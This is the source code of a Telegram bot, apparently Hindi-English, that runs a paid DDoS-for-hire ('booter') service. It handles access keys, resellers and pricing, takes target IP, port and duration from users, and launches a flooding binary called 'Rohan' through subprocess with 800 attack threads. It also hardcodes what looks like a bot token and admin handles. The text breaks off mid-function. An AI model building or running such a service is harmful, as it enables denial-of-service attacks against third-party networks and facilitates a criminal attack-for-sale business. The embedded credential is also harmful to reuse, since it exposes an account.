import os
import json
import time
import random
import string
import threading
import datetime
import subprocess
import logging
import base64
import re
import asyncio
import shutil
import stat
import platform
from collections import deque
from uuid import uuid4
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_enhanced_v10.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Bot config
BOT_TOKEN = "8147615549:AAGwT0ppniPc4UqlgtB-akzN9t0B4djMTAY"  # Replace with your Telegram bot token
BOT_CONFIG = {
    'packet_size': 1024,
    'attack_threads': 800,
    'command_rate_limit': 5,  # Commands per minute
    'max_sessions': 1000,
    'session_timeout': 300,  # 5 minutes
    'backup_interval': 86400,  # 24 hours
    'max_folder_size': 100 * 1024 * 1024,  # 100 MB
    'feedback_chance': 0.5,  # 50% chance to ask for feedback
    'max_retries': 3,  # Max retries for issue resolution
    'maintenance_threshold': 5,  # Max errors before maintenance mode
    'diagnostic_interval': 86400,  # 24 hours for self-diagnostic
}

# Admin IDs
admin_id = {
    "6258297180": {"username": "@Rahul_618", "nickname": "Rahul"},
    "1807014348": {"username": "@sadiq9869", "nickname": "Master Owner"},
    "1866961136": {"username": "@Rohan2349", "nickname": "Rohan Guru"}
}

# Folder and file paths
BASE_DATA_DIR = "data"
BACKUP_DIR = "backups"
FILES = {
    'users': os.path.join(BASE_DATA_DIR, "users.json"),
    'keys': os.path.join(BASE_DATA_DIR, "keys.json"),
    'resellers': os.path.join(BASE_DATA_DIR, "resellers.json"),
    'logs': os.path.join(BASE_DATA_DIR, "logs.txt"),
    'feedback': os.path.join(BASE_DATA_DIR, "feedback.json"),
    'maintenance_logs': os.path.join(BASE_DATA_DIR, "maintenance_logs.txt"),
    'normal_text_logs': os.path.join(BASE_DATA_DIR, "normal_text_logs.txt")
}

# In-memory storage
users = {}
keys = {}
resellers = {}
feedbacks = {}
last_attack_time = {}
attacks = {}
data_lock = threading.Lock()
maintenance_lock = threading.Lock()
bot_start_time = datetime.datetime.now()
global_attack_active = False
maintenance_mode = False
COOLDOWN_PERIOD = 60
command_history = {}
MAX_HISTORY = 10
rate_limit_tracker = {}
banned_users = {}
sessions = {}
current_data_dir = BASE_DATA_DIR
last_backup_time = time.time()
last_diagnostic_time = time.time()
error_count = {}
maintenance_history = []
user_behavior = {}
normal_text_stats = {'total': 0, 'keywords': {}}

# Utility Functions
def encode_data(data):
    """Encode data with base64 for secure storage"""
    return base64.b64encode(json.dumps(data).encode()).decode()

def decode_data(encoded):
    """Decode base64 encoded data"""
    try:
        return json.loads(base64.b64decode(encoded).decode())
    except Exception as e:
        logger.error(f"Decode error: {e}")
        return {}

def create_random_key(length=12):
    """Generate random key with prefix"""
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return f"ROHAN-PK-{random_key.upper()}"

def parse_duration(text):
    """Parse duration string like '5 hours', '10 days', '2 months'"""
    try:
        parts = text.lower().split()
        if len(parts) != 2:
            return None, None
        value, unit = int(parts[0]), parts[1]
        if unit not in ["hour", "hours", "day", "days", "month", "months"]:
            return None, None
        return value, unit.rstrip('s')
    except Exception as e:
        logger.error(f"Parse duration error: {e}")
        return None, None

def calculate_cost(value, unit):
    """Calculate cost based on duration"""
    if unit == "hour":
        return value * 10
    elif unit == "day":
        return value * 100
    elif unit == "month":
        return value * 900
    return 0

def add_time_to_current_date(hours=0, days=0, months=0):
    """Add time to current date"""
    current_time = datetime.datetime.now()
    if months:
        days += months * 30
    return current_time + datetime.timedelta(days=days, hours=hours)

def validate_ip(ip):
    """Validate IP address"""
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(pattern, ip))

def sanitize_input(text):
    """Sanitize input to prevent injection"""
    return re.sub(r'[^\w\s.-]', '', text).strip()

def get_user_role(user_id):
    """Get user role"""
    user_id = str(user_id)
    if user_id in admin_id:
        return "Admin"
    elif user_id in resellers:
        return "Reseller"
    elif user_id in users:
        return "User"
    return None

def check_rate_limit(user_id, context):
    """Check if user is within command rate limit using deque"""
    user_id = str(user_id)
    now = time.time()
    if user_id not in rate_limit_tracker:
        rate_limit_tracker[user_id] = deque(maxlen=BOT_CONFIG['command_rate_limit'])
    while rate_limit_tracker[user_id] and now - rate_limit_tracker[user_id][0] > 60:
        rate_limit_tracker[user_id].popleft()
    if len(rate_limit_tracker[user_id]) >= BOT_CONFIG['command_rate_limit']:
        return False
    rate_limit_tracker[user_id].append(now)
    return True

def ban_user(user_id, duration_hours=1):
    """Ban user for specified hours"""
    user_id = str(user_id)
    banned_users[user_id] = datetime.datetime.now() + datetime.timedelta(hours=duration_hours)
    logger.warning(f"User {user_id} banned for {duration_hours} hours")

def is_banned(user_id):
    """Check if user is banned"""
    user_id = str(user_id)
    if user_id in banned_users and datetime.datetime.now() < banned_users[user_id]:
        return True
    if user_id in banned_users:
        del banned_users[user_id]
    return False

def check_session_timeout(user_id):
    """Check if session has timed out"""
    user_id = str(user_id)
    if user_id in sessions and time.time() - sessions[user_id]["last_active"] > BOT_CONFIG['session_timeout']:
        del sessions[user_id]
        return True
    return False

async def simulate_progress(chat_id, context, message, steps=5, delay=0.5):
    """Simulate neon progress bar via message edits"""
    neon_bars = ["🌌", "🔵", "🟢", "🟣", "🔴"]
    for i in range(steps + 1):
        progress = int((i / steps) * 10)
        bar = random.choice(neon_bars) * progress + "⚪" * (10 - progress)
        percentage = int((i / steps) * 100)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message.message_id,
                text=f"{message.text}\n⏳ *Neon Progress*: [{bar}] {percentage}% 🚀",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Progress edit error: {e}")
            break
        await asyncio.sleep(delay)

async def request_feedback(user_id, context, action):
    """Request feedback after an action with enhanced neon UI"""
    if random.random() > BOT_CONFIG['feedback_chance']:
        return
    sessions[user_id]["state"] = "feedback_input"
    sessions[user_id]["feedback_action"] = action
    keyboard = [
        [InlineKeyboardButton("📝 Feedback De 🌟", callback_data="feedback_submit"),
         InlineKeyboardButton("⏭ Skip Kar ⚡", callback_data="feedback_skip")]
    ]
    banner = (
        "```\n"
        "╔══════════════════════════════════════╗\n"
        "║   🌌 Neon Feedback Cyber Zone 🌌     ║\n"
        "╚══════════════════════════════════════╝\n"
        "```"
    )
    msg = await context.bot.send_message(
        chat_id=user_id,
        text=f"{banner}\n😎 *Yo, {action} kaisa tha?* 🚀\nApna feedback de, bot ko aur cyberpunk bana! 😜 No pressure, par mast hai! 🌟",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    await simulate_progress(user_id, context, msg)

# Maintenance and Self-Improvement
def log_maintenance(event, details):
    """Log maintenance events"""
    ensure_data_dir()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {event}: {details}\n"
    try:
        set_file_permissions(FILES['maintenance_logs'], read_only=False)
        with open(FILES['maintenance_logs'], "a") as file:
            file.write(log_entry)
        set_file_permissions(FILES['maintenance_logs'], read_only=True)
        maintenance_history.append({"event": event, "details": details, "timestamp": timestamp})
    except Exception as e:
        logger.error(f"Maintenance log error: {e}")

async def enter_maintenance_mode(context, reason):
    """Enter maintenance mode with enhanced neon UI"""
    global maintenance_mode
    with maintenance_lock:
        maintenance_mode = True
    logger.warning(f"Entering maintenance mode: {reason}")
    log_maintenance("Maintenance Mode Entered", reason)
    banner = (
        "```\n"
        "╔══════════════════════════════════════╗\n"
        "║   🛠 Neon Cyber Maintenance 🌌        ║\n"
        "╠══════════════════════════════════════╣\n"
        "║ 🚧 Fixing Critical Bugs...           ║\n"
        "║ ⏳ Back Online in a Flash!           ║\n"
        "╚══════════════════════════════════════╝\n"
        "```"
    )
    for user_id in list(sessions.keys()) + list(admin_id.keys()):
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"{banner}\n🛠 *Bot in neon maintenance mode!* 😎\nReason: {reason}\nHold tight, fixing fast! 🚀",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Maintenance notification error for {user_id}: {e}")

async def exit_maintenance_mode(context, resolution):
    """Exit maintenance mode with enhanced neon UI"""
    global maintenance_mode, error_count
    with maintenance_lock:
        maintenance_mode = False
        error_count = {}
    logger.info(f"Exiting maintenance mode: {resolution}")
    log_maintenance("Maintenance Mode Exited", resolution)
    banner = (
        "```\n"
        "╔══════════════════════════════════════╗\n"
        "║   ✅ Neon Bot Back in Action! 🌌      ║\n"
        "╠══════════════════════════════════════╣\n"
        "║ 🚀 Ready to Dominate the Network!    ║\n"
        "╚══════════════════════════════════════╝\n"
        "```"
    )
    for user_id in list(sessions.keys()) + list(admin_id.keys()):
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"{banner}\n✅ *Bot back in neon cyber mode!* 😎\nResolution: {resolution}\nLet’s shake the network! 🚀",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Maintenance exit notification error for {user_id}: {e}")

async def try_resolve_issue(context, issue_type, details):
    """Attempt to resolve an issue"""
    retries = 0
    while retries < BOT_CONFIG['max_retries']:
        try:
            if issue_type == "file_corruption":
                restore_from_backup(details['file_path'])
                return True, "Restored from backup"
            elif issue_type == "subprocess_failure":
                if not os.path.exists('./Rohan'):
                    return False, "Rohan binary missing"
                return True, "Binary path verified"
            elif issue_type == "rate_limit_exceeded":
                BOT_CONFIG['command_rate_limit'] += 2
                for admin in admin_id:
                    await context.bot.send_message(
                        chat_id=admin,
                        text=f"⚠️ *Neon Rate Limit Increased* 📈\nNew Limit: {BOT_CONFIG['command_rate_limit']} commands/min 🌌",
                        parse_mode="Markdown"
                    )
                return True, "Rate limit increased"
            elif issue_type == "memory_overload":
                global users, keys, resellers, feedbacks
                users.clear()
                keys.clear()
                resellers.clear()
                feedbacks.clear()
                load_data()
                return True, "Memory flushed and reloaded"
            return False, "Unknown issue type"
        except Exception as e:
            retries += 1
            logger.error(f"Retry {retries}/{BOT_CONFIG['max_retries']} for {issue_type}: {e}")
            await asyncio.sleep(1)
    return False, f"Failed after {BOT_CONFIG['max_retries']} retries"

async def handle_critical_issue(context, issue_type, details):
    """Handle critical issues with enhanced neon UI"""
    await enter_maintenance_mode(context, f"Critical {issue_type}: {details}")
    success, resolution = await try_resolve_issue(context, issue_type, {'file_path': details} if issue_type == "file_corruption" else {})
    if success:
        await exit_maintenance_mode(context, resolution)
    else:
        for admin in admin_id:
            await context.bot.send_message(
                chat_id=admin,
                text=f"🚨 *Neon Critical Issue Unresolved* 😔\nType: {issue_type}\nDetails: {details}\nResolution: {resolution}\nManual intervention needed! 🌌",
                parse_mode="Markdown"
            )
        log_maintenance("Critical Issue Unresolved", f"{issue_type}: {details}")

def track_error(issue_type):
    """Track errors and trigger maintenance if threshold exceeded"""
    error_count[issue_type] = error_count.get(issue_type, 0) + 1
    if error_count[issue_type] >= BOT_CONFIG['maintenance_threshold']:
        return True
    return False

def analyze_user_behavior(user_id, action, skipped=False):
    """Analyze user behavior for self-improvement"""
    user_id = str(user_id)
    if user_id not in user_behavior:
        user_behavior[user_id] = {'skips': 0, 'errors': {}, 'commands': {}, 'normal_text': 0}
    if skipped:
        user_behavior[user_id]['skips'] += 1
    if action == "normal_text":
        user_behavior[user_id]['normal_text'] += 1
    else:
        user_behavior[user_id]['commands'][action] = user_behavior[user_id]['commands'].get(action, 0) + 1
    return user_behavior[user_id]

async def self_improve(context):
    """Run self-improvement based on logs and user behavior"""
    suggestions = []
    # Analyze logs
    if os.path.exists(FILES['logs']):
        try:
            set_file_permissions(FILES['logs'], read_only=False)
            with open(FILES['logs'], "r") as file:
                logs = file.readlines()[-100:]
            set_file_permissions(FILES['logs'], read_only=True)
            error_count = sum(1 for line in logs if "failed" in line.lower() or "error" in line.lower())
            if error_count > 10:
                suggestions.append("⚠️ High error rate in logs. Consider stricter input validation or binary path checks.")
        except Exception as e:
            logger.error(f"Log analysis error: {e}")

    # Analyze user behavior
    high_skip_users = [uid for uid, data in user_behavior.items() if data['skips'] > 5]
    if high_skip_users:
        suggestions.append(f"⚠️ Users {', '.join(high_skip_users)} frequently skip feedback. Simplify UI or add more command examples.")
    
    # Analyze error patterns
    common_errors = {}
    for data in user_behavior.values():
        for err_type, count in data['errors'].items():
            common_errors[err_type] = common_errors.get(err_type, 0) + count
    for err_type, count in common_errors.items():
        if count > 5:
            suggestions.append(f"⚠️ Frequent {err_type} errors. Implement auto-fix or better user guidance.")

    # Analyze normal text patterns
    frequent_keywords = [k for k, v in normal_text_stats['keywords'].items() if v > 5]
    if frequent_keywords:
        suggestions.append(f"⚠️ Frequent normal text keywords: {', '.join(frequent_keywords)}. Add specific responses or UI guidance for these.")

    if suggestions:
        for admin in admin_id:
            await context.bot.send_message(
                chat_id=admin,
                text=f"🤖 *Neon Self-Improvement Report* 📈\n" + "\n".join(suggestions),
                parse_mode="Markdown"
            )
        log_maintenance("Self-Improvement", "\n".join(suggestions))

async def cleanup_sessions(context):
    """Periodically clean expired sessions"""
    while True:
        current_time = time.time()
        expired = [uid for uid, session in sessions.items() if current_time - session["last_active"] > BOT_CONFIG['session_timeout']]
        for uid in expired:
            del sessions[uid]
            logger.info(f"Cleaned expired session for user {uid}")
        await asyncio.sleep(300)  # Check every 5 minutes

async def run_self_diagnostic(context):
    """Run periodic self-diagnostic"""
    global last_diagnostic_time
    while True:
        if time.time() - last_diagnostic_time < BOT_CONFIG['diagnostic_interval']:
            await asyncio.sleep(3600)
            continue
        issues = []
        # Check binary existence
        if not os.path.exists('./Rohan'):
            issues.append("⚠️ Rohan binary missing!")
        # Check data folder size
        if get_folder_size(current_data_dir) > BOT_CONFIG['max_folder_size'] * 0.9:
            issues.append("⚠️ Data folder nearing capacity!")
        # Check memory usage
        if len(sessions) > BOT_CONFIG['max_sessions'] * 0.9:
            issues.append("⚠️ Session count nearing limit!")
        if issues:
            for admin in admin_id:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"🩺 *Neon Self-Diagnostic Report* 🌌\n" + "\n".join(issues),
                    parse_mode="Markdown"
                )
        logger.info("Self-diagnostic completed")
        last_diagnostic_time = time.time()
        await asyncio.sleep(3600)

# Data Management
def get_folder_size(folder):
    """Calculate folder size in bytes"""
    total_size = 0
    try:
        for dirpath, _, filenames in os.walk(folder):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                total_size += os.path.getsize(fp)
    except Exception as e:
        logger.error(f"Folder size calculation error: {e}")
    return total_size

def create_new_data_dir():
    """Create new data directory if current one is full"""
    global current_data_dir, FILES
    i = 1
    while os.path.exists(f"data_{i}"):
        i += 1
    new_dir = f"data_{i}"
    try:
        os.makedirs(new_dir)
        current_data_dir = new_dir
        for key in FILES:
            FILES[key] = os.path.join(current_data_dir, os.path.basename(FILES[key]))
        logger.info(f"Switched to new data directory: {new_dir}")
    except Exception as e:
        logger.error(f"Create new data dir error: {e}")

def ensure_data_dir():
    """Ensure data directory exists and has space"""
    try:
        if not os.path.exists(current_data_dir):
            os.makedirs(current_data_dir)
        if get_folder_size(current_data_dir) > BOT_CONFIG['max_folder_size']:
            create_new_data_dir()
    except Exception as e:
        logger.error(f"Ensure data dir error: {e}")

def set_file_permissions(file_path, read_only=True):
    """Set file permissions to read-only or read-write, platform-aware"""
    try:
        if platform.system() == "Windows":
            # Windows: Use os.chmod with limited support
            mode = stat.S_IREAD if read_only else stat.S_IREAD | stat.S_IWRITE
            os.chmod(file_path, mode)
        else:
            # Unix: Use chmod with octal permissions
            mode = 0o444 if read_only else 0o664
            os.chmod(file_path, mode)
    except Exception as e:
        logger.error(f"Error setting permissions for {file_path}: {e}")
        if track_error("file_permission"):
            asyncio.create_task(handle_critical_issue(Application._context, "file_permission", f"Cannot set permissions for {file_path}"))

def load_data():
    """Load data from JSON files"""
    global users, keys, resellers, feedbacks
    ensure_data_dir()
    with data_lock:
        try:
            users = decode_data(read_json(FILES['users'], encode_data({})))
            keys = decode_data(read_json(FILES['keys'], encode_data({})))
            resellers = decode_data(read_json(FILES['resellers'], encode_data({})))
            feedbacks = decode_data(read_json(FILES['feedback'], encode_data({})))
            logger.info("Data loaded successfully")
        except Exception as e:
            logger.error(f"Data load failed: {e}")
            if track_error("data_load"):
                asyncio.create_task(handle_critical_issue(Application._context, "data_load", str(e)))
    for file_path in FILES.values():
        set_file_permissions(file_path, read_only=True)

def read_json(file_path, default):
    """Read JSON file"""
    ensure_data_dir()
    try:
        set_file_permissions(file_path, read_only=False)
        with open(file_path, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logger.error(f"Error reading {file_path}: {e}")
        if track_error("file_corruption"):
            asyncio.create_task(handle_critical_issue(Application._context, "file_corruption", file_path))
        set_file_permissions(file_path, read_only=True)
        return default

def save_json(file_path, data):
    """Save data to JSON file"""
    ensure_data_dir()
    with data_lock:
        try:
            set_file_permissions(file_path, read_only=False)
            with open(file_path, "w") as file:
                json.dump(encode_data(data), file, indent=4)
        except Exception as e:
            logger.error(f"Error saving {file_path}: {e}")
            if track_error("file_corruption"):
                asyncio.create_task(handle_critical_issue(Application._context, "file_corruption", file_path))
            restore_from_backup(file_path)
        finally:
            set_file_permissions(file_path, read_only=True)

def create_backup():
    """Create backup of all data files"""
    global last_backup_time
    if time.time() - last_backup_time < BOT_CONFIG['backup_interval']:
        return
    backup_dir = os.path.join(BACKUP_DIR, datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S'))
    try:
        os.makedirs(backup_dir, exist_ok=True)
        for key, file_path in FILES.items():
            if os.path.exists(file_path):
                shutil.copy(file_path, os.path.join(backup_dir, os.path.basename(file_path)))
        last_backup_time = time.time()
        logger.info(f"Backup created at {backup_dir}")
    except Exception as e:
        logger.error(f"Backup creation error: {e}")

def restore_from_backup(file_path):
    """Restore file from latest backup"""
    try:
        backup_dirs = sorted([d for d in os.listdir(BACKUP_DIR) if os.path.isdir(os.path.join(BACKUP_DIR, d))], reverse=True)
        for backup in backup_dirs:
            backup_file = os.path.join(BACKUP_DIR, backup, os.path.basename(file_path))
            if os.path.exists(backup_file):
                shutil.copy(backup_file, file_path)
                logger.info(f"Restored {file_path} from backup {backup}")
                return
        logger.error(f"No backup found for {file_path}")
        if track_error("backup_restore"):
            asyncio.create_task(handle_critical_issue(Application._context, "backup_restore", f"No backup for {file_path}"))
    except Exception as e:
        logger.error(f"Backup restore error: {e}")

# Logging and Notifications
def log_command(user_id, target, port, time):
    """Log attack command and notify admins with enhanced neon UI"""
    ensure_data_dir()
    user_info = admin_id.get(str(user_id), {"nickname": f"UserID: {user_id}", "username": f"UserID: {user_id}"})
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = (
        f"[{timestamp}] Nickname: {user_info['nickname']} (Username: {user_info['username']})\n"
        f"Target: {target}\nPort: {port}\nTime: {time} seconds\nBinary: Rohan\n\n"
    )
    try:
        set_file_permissions(FILES['logs'], read_only=False)
        with open(FILES['logs'], "a") as file:
            file.write(log_entry)
        set_file_permissions(FILES['logs'], read_only=True)
        for admin in admin_id:
            asyncio.create_task(
                Application.bot.send_message(
                    chat_id=admin,
                    text=f"🔥 *Neon Cyber Attack Log* 📝\n```{log_entry}```",
                    parse_mode="Markdown"
                )
            )
    except Exception as e:
        logger.error(f"Log command error: {e}")

def log_key_generation(user_id, key, duration, cost=0):
    """Log key generation and notify admins with enhanced neon UI"""
    ensure_data_dir()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    role = get_user_role(user_id)
    log_entry = (
        f"[{timestamp}] Key Generated\n"
        f"Creator: {user_id} ({role})\n"
        f"Key: {key}\n"
        f"Duration: {duration}\n"
        f"Cost: {cost} Rs\n\n"
    )
    try:
        set_file_permissions(FILES['logs'], read_only=False)
        with open(FILES['logs'], "a") as file:
            file.write(log_entry)
        set_file_permissions(FILES['logs'], read_only=True)
        for admin in admin_id:
            asyncio.create_task(
                Application.bot.send_message(
                    chat_id=admin,
                    text=f"🔐 *Neon Cyber Key Generated* 🗝️\n```{log_entry}```",
                    parse_mode="Markdown"
                )
            )
    except Exception as e:
        logger.error(f"Log key generation error: {e}")

def log_normal_text(user_id, text, response):
    """Log normal text messages and responses"""
    ensure_data_dir()
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = (
        f"[{timestamp}] User: {user_id}\n"
        f"Message: {text}\n"
        f"Response: {response}\n\n"
    )
    try:
        set_file_permissions(FILES['normal_text_logs'], read_only=False)
        with open(FILES['normal_text_logs'], "a") as file:
            file.write(log_entry)
        set_file_permissions(FILES['normal_text_logs'], read_only=True)
    except Exception as e:
        logger.error(f"Log normal text error: {e}")

# Normal Text Response Generation
def generate_normal_text_response(user_id, text):
    """Generate context-based neon response for normal text"""
    text = text.lower()
    role = get_user_role(user_id)
    nickname = admin_id[user_id]['nickname'] if user_id in admin_id else "Cyber Ninja"
    behavior = user_behavior.get(user_id, {'skips': 0, 'errors': {}, 'commands': {}, 'normal_text': 0})
    
    # Update normal text stats
    normal_text_stats['total'] += 1
    for word in text.split():
        normal_text_stats['keywords'][word] = normal_text_stats['keywords'].get(word, 0) + 1

    # Enhanced keyword-based neon responses
    if "attack" in text or "ddos" in text:
        if "not working" in text or "nahi chal raha" in text or "fail" in text:
            return (
                f"🌌 *Arre {nickname}, attack issue?* 😅\n"
                f"🎯 IP/port check kar (e.g., `127.0.0.1 8000 60`).\n"
                f"🔄 Ya `/start` se menu khol aur *Attack Launch Kar* try kar! 😎\n"
                f"⚠️ Recent errors: {behavior['errors'].get('subprocess_failure', 0)} subprocess fails.\n"
                f"📞 Support: @Rahul_618, @Rohan2349, @sadiq9869"
            )
        return (
            f"🌌 *Yo {nickname}, attack launch karna hai?* 🔥\n"
            f"🚀 `/start` kar, *Attack Launch Kar* daba, aur IP, port, time daal (e.g., `127.0.0.1 8000 60`).\n"
            f"💥 Max duration: 240s. Chalo, network hila do! 😎"
        )
    elif "key" in text or "redeem" in text:
        return (
            f"🌌 *Bhai {nickname}, key redeem karna hai?* 🗝️\n"
            f"🔐 `/start` kar, *Key Redeem Kar* choose kar, aur valid key daal (e.g., `ROHAN-PK-ABCD1234`).\n"
            f"🌟 Abhi try kar! 😎"
        )
    elif "help" in text or "kya" in text or "samajh" in text:
        return (
            f"🌌 *Yo {nickname}, welcome to Rohan DDoS Cyber Center!* 🚀\n"
            f"💻 Ultimate neon tool for network domination.\n"
            f"🔍 `/start` kar ke menu dekh, attack launch kar, keys redeem kar, ya status check kar.\n"
            f"❓ Specific help chahiye? Bol! 😎"
        )
    elif "balance" in text and role == "Reseller":
        return (
            f"🌌 *Arre {nickname}, balance check karna hai?* 💸\n"
            f"🔍 `/start` kar, *Balance Dekh* daba.\n"
            f"💰 Current balance: {resellers.get(user_id, 0)} Rs. 😎"
        )
    elif "error" in text or "problem" in text:
        recent_errors = behavior.get('errors', {})
        if recent_errors:
            error_summary = ", ".join([f"{k}: {v}" for k, v in recent_errors.items()])
            return (
                f"🌌 *Bhai {nickname}, problem hai?* 😔\n"
                f"⚠️ Recent errors: {error_summary}.\n"
                f"📝 Specific issue bataye to fix karte hain! `/start` try kar ya @Rahul_618 se baat kar. 🚀"
            )
        return (
            f"🌌 *Arre {nickname}, kya problem hai?* 😅\n"
            f"📝 Thodi detail de, ya `/start` kar ke menu se try kar.\n"
            f"📞 Support ke liye @Rahul_618, @Rohan2349 ya @sadiq9869 se baat kar! 😎"
        )
    elif "hi" in text or "hello" in text or "kya chal raha" in text:
        return (
            f"🌌 *Yo {nickname}, kya bol raha hai?* 😎\n"
            f"💥 Network hilaana hai to `/start` kar, menu se attack, key redeem, ya status choose kar! 🚀"
        )

    # Fallback neon response
    return (
        f"🌌 *Bhai {nickname}, thodi si clear baat kar!* 😅\n"
        f"🎯 Attack chahiye, key redeem karna hai, ya kuch aur?\n"
        f"🔍 `/start` try kar menu ke liye, ya detail de! 😎"
    )

# Feedback and Self-Improvement Analysis
def analyze_feedback():
    """Analyze feedback for common issues and suggest improvements"""
    issue_keywords = ["error", "fail", "bug", "crash", "invalid"]
    suggestions = []
    issue_count = {}
    for feedback in feedbacks.values():
        message = feedback["message"].lower()
        for keyword in issue_keywords:
            if keyword in message:
                issue_count[keyword] = issue_count.get(keyword, 0) + 1
    for keyword, count in issue_count.items():
        if count > 3:
            if keyword == "invalid":
                suggestions.append("⚠️ Frequent 'invalid' errors. Consider stricter IP/port validation.")
            elif keyword in ["error", "fail", "crash"]:
                suggestions.append(f"⚠️ Frequent '{keyword}' reports. Check logs for subprocess or file errors.")
            elif keyword == "bug":
                suggestions.append("⚠️ Users reporting bugs. Request detailed bug reports via feedback.")
    return suggestions

async def notify_admins_suggestions(context):
    """Notify admins of improvement suggestions with enhanced neon UI"""
    suggestions = analyze_feedback()
    if suggestions:
        for admin in admin_id:
            await context.bot.send_message(
                chat_id=admin,
                text=f"📢 *Neon Cyber Improvement Suggestions* 🌌\n" + "\n".join(suggestions),
                parse_mode="Markdown"
            )

# Attack Handling
def run_attack(user_id, ip, port, duration, context):
    """Run attack process with enhanced neon UI"""
    global global_attack_active
    try:
        if not os.path.exists('./Rohan'):
            raise FileNotFoundError("Rohan binary not found")
        with data_lock:
            global_attack_active = True
        packet_size = BOT_CONFIG['packet_size']
        process = subprocess.Popen(
            ['./Rohan', ip, str(port), str(duration), str(packet_size)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        with data_lock:
            attacks[str(user_id)] = {'process': process}
        stdout, stderr = process.communicate(timeout=duration + 10)
        if process.returncode != 0:
            raise subprocess.SubprocessError(f"Attack failed: {stderr.decode('utf-8', errors='ignore')}")
        context.bot.send_message(
            chat_id=user_id,
            text=f"✅ *Neon Cyber Attack Completed* 🎉\n- 🎯 *Target*: {ip}:{port}\n- ⏱ *Duration*: {duration} seconds\n- 🏆 *Result*: Success! 🌌",
            parse_mode="Markdown"
        )
    except (FileNotFoundError, subprocess.SubprocessError, subprocess.TimeoutExpired) as e:
        logger.error(f"Attack error: {e}")
        user_behavior[str(user_id)]['errors']['subprocess_failure'] = user_behavior.get(str(user_id), {'errors': {}})['errors'].get('subprocess_failure', 0) + 1
        if track_error("subprocess_failure"):
            asyncio.create_task(handle_critical_issue(context, "subprocess_failure", str(e)))
        context.bot.send_message(
            chat_id=user_id,
            text=f"❌ *Neon Cyber Attack Failed* 😔\n- ⚠️ *Error*: {str(e)}\n- 💡 *Suggestion*: Check binary path or reduce duration.\n🔄 *Retry?* 🌌",
            parse_mode="Markdown"
        )
    except Exception as e:
        logger.error(f"Unexpected attack error: {e}")
        user_behavior[str(user_id)]['errors']['unexpected_error'] = user_behavior.get(str(user_id), {'errors': {}})['errors'].get('unexpected_error', 0) + 1
        if track_error("unexpected_error"):
            asyncio.create_task(handle_critical_issue(context, "unexpected_error", str(e)))
        context.bot.send_message(
            chat_id=user_id,
            text=f"❌ *Neon Cyber Attack Failed* 😔\n- ⚠️ *Error*: Unexpected error\n- 💡 *Suggestion*: Contact @Rahul_618.\n🔄 *Retry?* 🌌",
            parse_mode="Markdown"
        )
    finally:
        with data_lock:
            if str(user_id) in attacks:
                del attacks[str(user_id)]
            global_attack_active = False
        asyncio.create_task(request_feedback(user_id, context, "attack"))

# Telegram Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with enhanced neon UI"""
    user_id = str(update.effective_user.id)
    if maintenance_mode:
        await update.message.reply_text(
            "🛠 *Neon Cyber Maintenance Mode!* 😎\nHold tight, we’re fixing things fast! 🚀",
            parse_mode="Markdown"
        )
        return
    if is_banned(user_id):
        await update.message.reply_text("🚫 *Banned!* 😡 You can’t use this bot! 🌌")
        return
    if not check_rate_limit(user_id, context):
        await update.message.reply_text("⏳ *Chill, Bro!* 😎 Too many commands, wait a minute. 🌌")
        return
    role = get_user_role(user_id)
    if not role:
        await update.message.reply_text(
            "🔒 *Access Denied* 😕\nInvalid ID, bro! Talk to @Rahul_618, @Rohan2349, or @sadiq9869. 🌌",
            parse_mode="Markdown"
        )
        return
    sessions[user_id] = {"role": role, "last_active": time.time(), "state": None}
    banner = (
        "```\n"
        "╔══════════════════════════════════════╗\n"
        "║   🌌 Neon DDoS Cyber Center v6.1     ║\n"
        "╠══════════════════════════════════════╣\n"
        "║ 🚀 Elite Cyber Network Dominator     ║\n"
        "║ 👑 Owner: @Rahul_618                 ║\n"
        "║ 📞 Support: @Rohan2349, @sadiq9869   ║\n"
        "║ 🌟 Version: 6.1 - Cyberpunk Elite    ║\n"
        "╚══════════════════════════════════════╝\n"
        "```"
    )
    welcome_text = (
        f"{banner}\n"
        f"👋 *Yo, {admin_id[user_id]['nickname'] if user_id in admin_id else 'Cyber Ninja'}!* 😎\n"
        f"🔑 *Role*: {role} 🔥\n"
        f"🕒 *Last Active*: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ⏰\n"
        f"Choose an option below and dominate the network! 🚀"
    )
    keyboard = [
        [InlineKeyboardButton("🚀 *Launch Cyber Attack* 🌌", callback_data="attack"),
         InlineKeyboardButton("👤 *My Cyber Profile* 🌟", callback_data="profile")],
        [InlineKeyboardButton("🔑 *Redeem Cyber Key* 🗝️", callback_data="redeem"),
         InlineKeyboardButton("📊 *System Status* 📈", callback_data="status")],
        [InlineKeyboardButton("🔐 *View Keys* 🔍", callback_data="list_keys")],
    ]
    if role == "Reseller":
        keyboard.append([InlineKeyboardButton("💰 *Check Balance* 💸", callback_data="balance"),
